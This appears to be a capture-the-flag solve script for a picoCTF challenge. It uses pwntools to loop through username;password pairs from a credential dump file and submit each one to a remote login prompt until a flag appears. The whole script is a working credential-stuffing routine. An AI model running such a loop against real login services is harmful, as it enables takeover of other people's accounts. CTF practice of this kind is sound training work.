from pwn import *


with open("creds-dump.txt", "r", encoding="utf-8") as file:
   lines = file.readlines()
for l in lines:
    r = remote("crystal-peak.picoctf.net" , 59146)
    username , password = l.split(';')
    r.recvuntil(b"Username:")
    r.sendline(username.encode())
    r.recvuntil(b"Password:")
    r.sendline(password.encode())
    flag = False
    while True:
        try:
            a = r.recvline()
            if b"correct" in a or b"picoCTF{" in a:
                print("found it!")
                print(a)
                flag = True
        except EOFError:break
    if flag:break
